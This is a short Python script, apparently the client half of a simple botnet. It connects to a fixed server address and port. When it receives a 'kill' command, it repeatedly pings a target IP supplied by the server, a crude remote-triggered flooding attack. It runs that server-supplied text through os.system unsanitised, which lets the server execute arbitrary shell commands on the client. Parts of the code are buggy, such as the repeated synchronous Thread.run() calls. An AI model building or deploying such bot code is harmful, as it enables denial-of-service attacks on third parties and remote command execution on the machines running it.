import socket
import threading
import os

# Thread de ping.
def thread_ping(ip):
	os.system("ping " + ip)

# Thread permettant au client de recevoir des messages et commandes du serveur.
def thread_recevoir(client_socket):
	while True:
		reponse = client.recv(1024)
		reponse = reponse.decode("utf-8")
		print(reponse)
		if "kill" in reponse:
			ip = reponse[5:]
			thread_ping1 = threading.Thread(target=thread_ping, args={ip,})
			thread_ping1.run()
			thread_ping1.run()
			thread_ping1.run()
			thread_ping1.run()
			thread_ping1.run()
			thread_ping1.run()
			thread_ping1.run()
			thread_ping1.run()

# Début du main
serveur_ip = "192.168.60.45"
serveur_port = 9999

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client.connect((serveur_ip, serveur_port))

thread_recevoir = threading.Thread(target=thread_recevoir,args={client,})
thread_recevoir.start()

while True:
	texte = input()
	client.send(str.encode(texte))
